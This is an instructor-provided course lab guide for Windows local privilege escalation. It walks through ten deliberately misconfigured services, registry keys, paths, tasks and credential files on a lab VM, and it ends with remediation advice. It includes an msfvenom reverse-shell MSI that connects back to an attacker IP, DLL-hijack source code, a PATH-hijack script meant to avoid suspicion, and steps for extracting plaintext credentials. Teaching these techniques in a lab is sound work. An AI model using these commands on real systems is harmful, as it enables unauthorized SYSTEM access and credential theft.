# SEC-335 Lab: Windows Local Privilege Escalation

## Overview

This lab demonstrates common Windows misconfigurations that allow local privilege escalation. You will learn to identify and exploit these vulnerabilities using the techniques covered in class.

**Target System:** Windows 10 VM (provided by instructor)  
**Your Account:** Non-administrative user (provided by instructor)  
**Objective:** Escalate from your low-privilege user to SYSTEM or Administrator

---

## Lab Environment

### Files Provided

| File | Description |
|------|-------------|
| `benign-service/` | Go source for legitimate service binary |
| `exploit-payload/` | Go source for benign exploit payload |
| `Setup-Lab.ps1` | Instructor script to configure vulnerabilities |
| `Cleanup-Lab.ps1` | Instructor script to remove vulnerabilities |

### Building the Binaries

Both Go programs use [kardianos/service](https://github.com/kardianos/service) for proper Windows service integration.

**Build the legitimate service binary:**
```powershell
cd benign-service
set GOOS=windows
set GOARCH=amd64
go build -o "Vulnerable Service.exe" .
```

**Build the exploit payload:**
```powershell
cd exploit-payload
set GOOS=windows
set GOARCH=amd64
go build -o "Program.exe" .
```

### Service Management Commands

The binaries support these commands (run from elevated prompt):

| Command | Description |
|---------|-------------|
| `install` | Register as a Windows service |
| `uninstall` | Remove the Windows service |
| `start` | Start the service |
| `stop` | Stop the service |
| `status` | Check service status |

Example:
```powershell
# Install and start the legitimate service
"Vulnerable Service.exe" install
"Vulnerable Service.exe" start

# Check status
"Vulnerable Service.exe" status

# Stop and uninstall
"Vulnerable Service.exe" stop
"Vulnerable Service.exe" uninstall
```

### Pre-configured Vulnerabilities

The lab VM has been configured with 10 intentional misconfigurations:

1. **Unquoted Service Path** - Service `VulnSvc`
2. **AlwaysInstallElevated** - MSI files install as SYSTEM
3. **Weak Service Permissions** - Service `WeakSvc`
4. **Weak Registry Permissions** - Service `RegSvc`
5. **DLL Hijacking** - Service `DLLHijackSvc`
6. **Missing Service Binary** - Service `MissingBinSvc`
7. **Writable PATH Directory** - `C:\Program Files\Common PATH`
8. **Startup Folder Permissions** - All-users startup folder
9. **Unattend.xml Credentials** - Plaintext passwords in config
10. **Scheduled Task** - Task `VulnScheduledTask`

---

## Exercise 1: Unquoted Service Path

### Background

When a Windows service path contains spaces but is NOT enclosed in quotes, Windows tries to execute intermediate paths. For example:

```
C:\Program Files\Vulnerable Service\Vulnerable Service.exe
```

Windows will try (in order):
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Service\Vulnerable Service.exe`

If an attacker can write to `C:\`, they can place a malicious `Program.exe` that executes with SYSTEM privileges.

### Step 1: Identify the Vulnerability

Run the detection script as your low-privilege user:

```powershell
.\Invoke-Privesc.ps1 -Groups 'Users,Everyone,Authenticated Users' -Whoami
```

Look for the section: **"Services with space in path and not enclosed with quotes"**

You should see:
```
C:\Program Files\Vulnerable Service\Vulnerable Service.exe
```

### Step 2: Verify Write Permissions

Check if you can write to `C:\`:

```powershell
# Try to create a test file
echo "test" > C:\test.txt

# If successful, you can exploit this!
# Remove the test file
del C:\test.txt
```

If you cannot write to `C:\`, check other directories in the path:
- `C:\Program Files\` (unlikely - usually requires admin)
- `C:\Program Files\Vulnerable Service\` (check permissions)

### Step 3: Place the Exploit Payload

Copy the exploit payload to the vulnerable location:

```powershell
# Copy the benign exploit payload
copy "C:\Labs\exploit-payload\Program.exe" "C:\Program.exe"
```

### Step 4: Trigger the Exploit

Start the vulnerable service:

```powershell
# Start the service (this will execute YOUR binary instead of the real one)
# Option 1: Using net command
net start VulnSvc

# Option 2: Using the service binary directly
"C:\Program Files\Vulnerable Service\Vulnerable Service.exe" start
```

You should see output from the exploit payload indicating successful code execution.

### Step 5: Verify Success

Check if the exploit marker file was created:

```powershell
type C:\exploit_success.txt
```

### Cleanup

```powershell
# Remove your exploit
del C:\Program.exe

# Stop the service
net stop VulnSvc
# Or: "C:\Program Files\Vulnerable Service\Vulnerable Service.exe" stop
```

---

## Exercise 2: AlwaysInstallElevated

### Background

When `AlwaysInstallElevated` is set to 1 in both HKLM and HKCU, any user can install MSI packages with SYSTEM privileges.

### Step 1: Verify the Setting

```powershell
# Check HKLM
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check HKCU
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both should return `0x1`.

### Step 2: Generate Malicious MSI

On your attack machine (Kali), use msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o shell.msi
```

Or use the Metasploit module:
```
use exploit/windows/local/always_install_elevated
```

### Step 3: Transfer and Execute

Transfer the MSI to the target and run:

```powershell
msiexec /quiet /qn /i shell.msi
```

The reverse shell should connect back as SYSTEM.

---

## Exercise 3: Weak Service Permissions

### Background

If a user has permission to modify a service's configuration (SERVICE_CHANGE_CONFIG), they can change the binary path to point to their own malicious executable.

### Step 1: Identify the Vulnerability

```powershell
# Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" * | findstr "SERVICE_CHANGE_CONFIG"
```

Or use the detection script output.

### Step 2: Modify the Service

```powershell
# Change the service binary path to your payload
sc config WeakSvc binPath= "C:\Labs\exploit-payload\Program.exe"

# Verify the change
sc qc WeakSvc
```

### Step 3: Trigger Execution

```powershell
# Restart the service
net stop WeakSvc
net start WeakSvc
```

### Cleanup

```powershell
# Restore original path
sc config WeakSvc binPath= "C:\Program Files\Weak Service\weakservice.exe"
```

---

## Exercise 4: Weak Registry Permissions

### Background

Service configurations are stored in the registry. If you can write to a service's registry key, you can modify the `ImagePath` value.

### Step 1: Check Registry Permissions

```powershell
# Check permissions on the service registry key
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\RegSvc" | Format-List
```

### Step 2: Modify ImagePath

```powershell
# Change the ImagePath to your payload
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\RegSvc" `
    -Name "ImagePath" -Value "C:\Labs\exploit-payload\Program.exe"
```

### Step 3: Trigger Execution

```powershell
net stop RegSvc
net start RegSvc
```

---

## Exercise 5: DLL Hijacking

### Background

If a service loads DLLs from a directory you can write to, you can place a malicious DLL that gets loaded instead of the legitimate one.

### Step 1: Identify Missing DLLs

Use Process Monitor (procmon.exe) to identify DLLs the service tries to load:

1. Filter by process name: `hijackapp.exe`
2. Filter by result: `NAME NOT FOUND`
3. Look for DLL loads from writable directories

### Step 2: Create Malicious DLL

Create a simple DLL (using C/C++):

```c
// malicious.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Your code here - for lab, just create a file
        FILE *f = fopen("C:\\dll_hijack_success.txt", "w");
        if (f) {
            fprintf(f, "DLL Hijack successful!\n");
            fclose(f);
        }
    }
    return TRUE;
}
```

Compile:
```bash
x86_64-w64-mingw32-gcc -shared -o hijack.dll malicious.c
```

### Step 3: Place and Trigger

```powershell
# Copy the malicious DLL to the service directory
copy hijack.dll "C:\Program Files\DLL Hijack App\"

# Restart the service
net stop DLLHijackSvc
net start DLLHijackSvc
```

---

## Exercise 6: Missing Service Binary

### Background

If a service points to a binary that doesn't exist, and you can write to that directory, you can place your own binary.

### Step 1: Verify the Binary is Missing

```powershell
Test-Path "C:\Program Files\Missing App\missing.exe"
# Should return False
```

### Step 2: Place Your Binary

```powershell
copy "C:\Labs\exploit-payload\Program.exe" "C:\Program Files\Missing App\missing.exe"
```

### Step 3: Start the Service

```powershell
net start MissingBinSvc
```

---

## Exercise 7: PATH Hijacking

### Background

If a directory in the system PATH is writable, you can place a malicious executable with the same name as a legitimate program.

### Step 1: Identify Writable PATH Directories

```powershell
# List PATH directories
$env:PATH -split ';'

# Check permissions on each
foreach ($dir in ($env:PATH -split ';')) {
    if ($dir -and (Test-Path $dir)) {
        $acl = Get-Acl $dir
        Write-Host "`n$dir" -ForegroundColor Yellow
        $acl.Access | Where-Object { $_.IdentityReference -match "Users|Everyone" } | 
            Format-Table IdentityReference, FileSystemRights
    }
}
```

### Step 2: Identify Target Executable

Find a commonly used executable that runs from PATH:

```powershell
# Example: if 'whoami.exe' is in a writable PATH directory
where.exe whoami
```

### Step 3: Create Malicious Version

Create a batch file or executable with the same name:

```batch
@echo off
echo PATH Hijack Successful!
echo Running as: %USERNAME%
echo Time: %DATE% %TIME%
REM Call the real executable to avoid suspicion
C:\Windows\System32\whoami.exe %*
```

Save as `whoami.bat` in the writable PATH directory.

---

## Exercise 8: Startup Folder

### Background

If you can write to the all-users startup folder, any executable you place there will run when ANY user logs in.

### Step 1: Verify Write Access

```powershell
# Try to create a file in the startup folder
echo "test" > "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\test.txt"
del "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\test.txt"
```

### Step 2: Place Payload

```powershell
copy "C:\Labs\exploit-payload\Program.exe" `
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

### Step 3: Wait for Trigger

The payload will execute the next time any user logs in.

---

## Exercise 9: Unattend.xml Credentials

### Background

Windows deployment configurations sometimes store credentials in plaintext XML files.

### Step 1: Locate the File

```powershell
# Check common locations
$paths = @(
    "C:\Windows\Panther\Unattend\Unattended.xml",
    "C:\Windows\Panther\Unattended.xml",
    "C:\Windows\System32\sysprep\Unattend.xml",
    "C:\unattend.xml"
)

foreach ($path in $paths) {
    if (Test-Path $path) {
        Write-Host "Found: $path" -ForegroundColor Green
    }
}
```

### Step 2: Extract Credentials

```powershell
# Read the file
Get-Content "C:\Windows\Panther\Unattend\Unattended.xml"

# Look for <Value> tags under <Password> sections
# The credentials are in plaintext!
```

### Step 3: Use the Credentials

Try the extracted credentials with:

```powershell
# Run as Administrator
runas /user:Administrator cmd.exe
```

---

## Exercise 10: Scheduled Task Hijacking

### Background

Similar to services, scheduled tasks with unquoted paths or writable directories can be exploited.

### Step 1: Identify the Task

```powershell
Get-ScheduledTask -TaskName "VulnScheduledTask" | 
    Select-Object TaskName, State, 
    @{Name="Action";Expression={$_.Actions.Execute}}
```

### Step 2: Check Path Permissions

```powershell
Get-Acl "C:\Program Files\Scheduled Task" | Format-List
```

### Step 3: Place Payload

```powershell
copy "C:\Labs\exploit-payload\Program.exe" "C:\Program Files\Scheduled Task\taskrunner.exe"
```

### Step 4: Wait or Trigger

The task runs daily at 3:00 AM, or trigger it manually:

```powershell
Start-ScheduledTask -TaskName "VulnScheduledTask"
```

---

## Detection Script Usage

The `Invoke-Privesc.ps1` script automates vulnerability detection:

```powershell
# Basic scan
.\Invoke-Privesc.ps1 -Groups 'Users,Everyone,Authenticated Users' -Whoami

# Extended scan (includes system info, network, processes)
.\Invoke-Privesc.ps1 -Groups 'Users,Everyone,Authenticated Users' -Whoami -Extended

# Long scan (includes registry key search - takes longer)
.\Invoke-Privesc.ps1 -Groups 'Users,Everyone,Authenticated Users' -Whoami -Extended -Long
```

---

## Submission Requirements

For each vulnerability you successfully exploit, document:

1. **Vulnerability Name**
2. **Detection Method** - How you found it
3. **Exploitation Steps** - Exact commands used
4. **Proof of Success** - Screenshot or output showing SYSTEM/admin access
5. **Remediation** - How to fix the misconfiguration

---

## Remediation Cheat Sheet

| Vulnerability | Fix |
|---------------|-----|
| Unquoted Service Path | Enclose path in quotes in service configuration |
| AlwaysInstallElevated | Set registry value to 0 or remove the key |
| Weak Service Permissions | Restrict SERVICE_CHANGE_CONFIG to admin only |
| Weak Registry Permissions | Restrict registry key permissions to admin only |
| DLL Hijacking | Use full paths for DLLs, restrict directory permissions |
| Missing Service Binary | Ensure binary exists, restrict directory permissions |
| Writable PATH | Remove write access from PATH directories |
| Startup Folder | Restrict write access to admin only |
| Unattend.xml | Delete file after deployment, or encrypt credentials |
| Scheduled Task | Use quoted paths, restrict directory permissions |

---

## Resources

- [MITRE ATT&CK: Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

---

## Safety Notice

**WARNING:** This lab is for educational purposes only. The techniques demonstrated should only be used in authorized lab environments. Unauthorized access to computer systems is illegal and unethical.

When finished, ensure your instructor runs `Cleanup-Lab.ps1` to remove all vulnerabilities from the lab VM.
